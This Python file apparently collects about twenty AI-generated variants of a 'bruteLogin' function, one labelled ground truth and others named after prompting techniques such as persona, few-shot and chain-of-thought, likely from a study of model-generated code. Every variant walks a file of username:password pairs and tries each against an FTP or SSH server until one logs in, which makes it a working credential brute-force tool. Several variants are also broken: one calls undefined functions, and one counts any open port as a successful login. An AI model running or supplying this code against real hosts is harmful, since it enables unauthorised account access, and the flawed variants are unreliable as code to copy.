import time
import ftplib
import socket
import os
from ftplib import FTP, error_perm
import paramiko
import re

def ground_truth_code_bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r') 
    for line in pF.readlines(): 
        time.sleep(1) 
        userName = line.split(':')[0] 
        passWord = line.split(':')[1].strip('\r').strip('\n') 
        try:
            ftp = ftplib.FTP(hostname) 
            ftp.login(userName, passWord) 
            ftp.quit() 
            return (userName, passWord) 
        except Exception as e: 
            pass 
    return (None, None)
def persona__bruteLogin(hostname, passwdFile):
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    with open(passwdFile, 'r') as file:
        for line in file:
            userName, password = line.strip().split(':')
            try:
                client.connect(hostname, username=userName, password=password, timeout=5)
                client.close()
                return (userName, password)
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                print(f'Connection error: {e}')
                break
            finally:
                import time
                time.sleep(1)

def template__bruteLogin(hostname, passwdFile):
	import time
	try:
		import paramiko
	except ImportError:
		return None
	client = paramiko.SSHClient()
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	with open(passwdFile, 'r') as file:
		for line in file.readlines():
			userName, password = line.strip().split(':')
			try:
				client.connect(hostname, username=userName, password=password, timeout=5)
				client.close()
				return (userName, password)
			except paramiko.AuthenticationException:
				pass
			except Exception as e:
				print(e)
			time.sleep(1)
	return None

def question_refinement__brute_force_login(hostname):
    import ftplib
    import time
    from hashlib import sha256
    with open('credentials.txt', 'r') as f:
        for line in f.read().splitlines():
            u_p = line.split(':')
            username = u_p[0]
            password = sha256(u_p[1].encode()).hexdigest()
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username, password)
                return (username, u_p[1])
            except (ftplib.all_errors, OSError):
                pass
            time.sleep(1)
    return None

def alternative_approaches__bruteLogin(hostname, passwdFile):
	try:
		import socket
		from urllib.parse import urlparse
		import time
		host = urlparse(hostname).netloc.split(':')[0]
		port = int(urlparse(hostname).netloc.split(':')[1]) if ':' in urlparse(hostname).netloc else 22
		with open(passwdFile, 'r') as file:
			for line in file:
				userName, password = line.strip().split(':')
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.settimeout(5)
				try:
					if sock.connect_ex((host, port)) == 0:
						sock.close()
						return (userName, password)
					else:
						sock.close()
				except Exception as e:
					pass
				time.sleep(1)
	except Exception as e:
		pass
	return None

def context_manager__bruteLogin(hostname, passwdFile):
	import paramiko
	s=paramiko.SSHClient()
	s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	with open(passwdFile, 'r') as file:
		for line in file:
			line=line.strip()
			userName,password=line.split(':')
			try:
				s.connect(hostname,port=22,username=userName,password=password)
				return (userName(password))
			except paramiko.AuthenticationException:
				pass
			import time
			time.sleep(1)

def flipped_interaction_3__bruteLogin(hostname, passwdFile):
	import ftplib
	import time
	with open(passwdFile, 'r') as file:
		for line in file:
			userName, passWord = line.strip().split(':')
			try:
				ftp = ftplib.FTP(hostname, timeout=10)
				ftp.login(userName, passWord)
				ftp.quit()
				return (userName, passWord)
			except Exception as e:
				pass
	time.sleep(1)
	return (None, None)

def flipped_interaction_4__bruteLogin(hostname, passwdFile, max_attempts=100, verbose=False):
    attempt_count = 0
    with open(passwdFile, 'r') as file:
        for line in file:
            if attempt_count >= max_attempts:
                if verbose:
                    print("Maximum number of attempts reached.")
                return (None, None)
            parts = line.strip().split(':')
            if len(parts) != 2:
                if verbose:
                    print(f"Skipping invalid line: {line.strip()}")
                continue
            username, password = parts
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username, password)
                ftp.quit()
                if verbose:
                    print(f"Successful login: {username}:{password}")
                return (username, password)
            except (ftplib.error_perm, ftplib.all_errors) as e:
                if verbose:
                    print(f"Failed login: {username}:{password} - {e}")
                ftp.close()
                attempt_count += 1
            finally:
                time.sleep(1)

def flipped_interaction_5__bruteLogin(hostname, passwdFile):
	paramiko = __import__('paramiko')
	logins = open(passwdFile).readlines()
	for login in logins:
		userName, password = login.strip().split(':')
		ssh = paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		try:
			ssh.connect(hostname, username=userName, password=password, timeout=5)
			return userName, password
		except paramiko.AuthenticationException:
			print(f'Failed: {userName}:{password}')
		except Exception as e:
			print(f'Connection error: {e}')
		finally:
			ssh.close()
		time.sleep(1)

def iterative_prompting_3__bruteLogin(hostname, passwdFile):
    if not isinstance(hostname, str) or not isinstance(passwdFile, str):
        raise ValueError('Hostname and passwdFile must be strings.')
    try:
        with open(passwdFile, 'r') as file:
            for line in file:
                parts = line.strip().split(':')
                if len(parts) != 2:
                    raise ValueError(f'Invalid format in passwdFile: {line}')
                user_name, password = parts
                try:
                    ftp = ftplib.FTP(hostname)
                    ftp.login(user_name, password)
                    ftp.quit()
                    return user_name, password
                except ftplib.all_errors as e:
                    pass
                finally:
                    time.sleep(1)
    except FileNotFoundError:
        raise FileNotFoundError(f'The file {passwdFile} does not exist.')
    except IOError as e:
        raise IOError(f'An error occurred while trying to read the file {passwdFile}: {e}')

def iterative_prompting_4__bruteLogin(hostname, passwdFile):
    if not isinstance(hostname, str):
        raise ValueError('Hostname must be a string.')
    if not isinstance(passwdFile, str) or not os.path.isfile(passwdFile):
        raise ValueError('passwdFile must be a valid file path.')
    with open(passwdFile, 'r') as file:
        for line in file:
            line = line.strip()
            if not line or ':' not in line:
                continue
            user_name, password = line.split(':', 1)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((hostname, 22))
                ssh = paramiko.SSHClient()
                ssh.load_system_host_keys()
                ssh.set_missing_host_key_policy(paramiko.RejectPolicy())
                ssh.connect(hostname, port=22, username=user_name, password=password, timeout=5)
                ssh.close()
                sock.close()
                return (user_name, password)
            except paramiko.AuthenticationException:
                pass
            except paramiko.BadHostKeyException as bad_host_key_exception:
                print(f'Bad host key: {bad_host_key_exception}')
                break
            except paramiko.SSHException as ssh_exception:
                print(f'SSH error: {ssh_exception}')
                break
            except socket.timeout as timeout_exception:
                print(f'Socket timeout: {timeout_exception}')
                break
            except socket.error as socket_exception:
                print(f'Socket error: {socket_exception}')
                break
            finally:
                time.sleep(1)

def iterative_prompting_5__bruteLogin(hostname, passwdFile):
    if not isinstance(hostname, str) or not isinstance(passwdFile, str):
        raise ValueError('Hostname and passwdFile must be strings')
    try:
        with open(passwdFile, 'r') as file:
            for line_number, line in enumerate(file, start=1):
                line = line.strip()
                if ':' not in line:
                    continue
                try:
                    user_name, password = line.split(':', 1)
                except ValueError:
                    print(f'Line {line_number} is malformed: {line}')
                    continue
                try:
                    if tryLogin(hostname, user_name, password):
                        return (user_name, password)
                except Exception as e:
                    print(f'Error during login attempt with {user_name} on line {line_number}: {e}')
                time.sleep(1)
    except FileNotFoundError:
        raise FileNotFoundError('The specified password file does not exist')
    except PermissionError:
        raise PermissionError('No permission to read the specified password file')
    except Exception as e:
        raise Exception(f'An error occurred: {e}')

def few_shots_prompting__bruteLogin(hostname, passwdFile):
	with open(passwdFile, 'r') as file:
		for line in file:
			username, password = line.strip().split(':')
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((hostname, 22))
				banner = s.recv(1024)
				s.send('USER ' + username + '\n')
				resp1 = s.recv(1024)
				s.send('PASS ' + password + '\n')
				resp2 = s.recv(1024)
				s.send('QUIT\n')
				s.close()
				if 'Login incorrect' not in resp2.split('\n')[1]:
					return (username, password)
			except Exception as e:
				pass
		time.sleep(1)
	return None

def cot_prompting__bruteLogin(hostname, passwdFile):
	with open(passwdFile, 'r') as file:
		for line in file:
			username, password = line.strip().split(':')
			try:
				session = paramiko.SSHClient()
				session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				session.connect(hostname, username=username, password=password)
				return (username, password)
			except paramiko.AuthenticationException:
				pass
			session.close()
			time.sleep(1)

def fact_check_list__bruteLogin(hostname, passwdFile):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with open(passwdFile, 'r') as file:
            for line in file:
                creds = line.strip().split(':')
                if len(creds) != 2:
                    continue
                username, password = creds
                try:
                    ssh.connect(hostname, port=22, username=username, password=password, timeout=5)
                    print(f"Success: Connected with username '{username}' and password '{password}'")
                    return (username, password)
                except paramiko.AuthenticationException:
                    print(f"Failed: Credentials '{username}:{password}' failed authentication.")
                except paramiko.SSHException as sshException:
                    print(f"Failed: SSH error occurred: {sshException}")
                except Exception as e:
                    print(f"Failed: An unexpected error occurred: {e}")
                time.sleep(1)
        print("No valid credentials found.")
        return None
    except FileNotFoundError:
        print(f"Error: The file '{passwdFile}' was not found.")
        return None
    except Exception as e:
        print(f"Error: An unexpected error occurred while reading the file: {e}")
        return None

def not_interactive_mix__bruteLogin(hostname, passwdFile):
    with suppress(FileNotFoundError):
        with open(passwdFile, 'r') as file:
            for line in file:
                time.sleep(1)
                try:
                    userName, password = line.strip().split(':')
                except ValueError:
                    continue
                with suppress(ftplib.all_errors):
                    ftp = ftplib.FTP(hostname)
                    ftp.login(userName, password)
                    return (userName, password)
    return None

def interactive_mix__bruteForceFTP(hostname, credentialsFile):
    import ftplib
    import time
    with open(credentialsFile, 'r') as f:
        credentials = f.readlines()
    max_attempts = 100
    attempt_count = 0
    for credential in credentials:
        if attempt_count >= max_attempts:
            print(f"Maximum attempts ({max_attempts}) reached. Exiting...")
            break
        credParts = credential.strip().split(':')
        if len(credParts) != 2:
            print(f"Skipping malformed line: {credential.strip()}")
            continue
        userName, password = credParts[0], credParts[1]
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(user=userName, passwd=password)
            ftp.quit()
            print(f"Success: Username: {userName}, Password: {password}")
            return (userName, password)
        except ftplib.all_errors as e:
            print(f"Failed: Username: {userName}, Password: {password}, Error: {e}")
        finally:
            time.sleep(1)
            attempt_count += 1
    print("No valid credentials found.")
    return None

def baseline__bruteLogin(hostname, passwdFile):
	import time
	from paramiko import SSHClient, AutoAddPolicy, AuthenticationException
	client = SSHClient()
	client.set_missing_host_key_policy(AutoAddPolicy())
	with open(passwdFile, 'r') as file:
		passwords = file.readlines()
	for pair in passwords:
		username, password = pair.strip().split(':')
		try:
			client.connect(hostname, username=username, password=password)
			return (username, password)
		except AuthenticationException:
			pass
		finally:
			time.sleep(1)
	return None
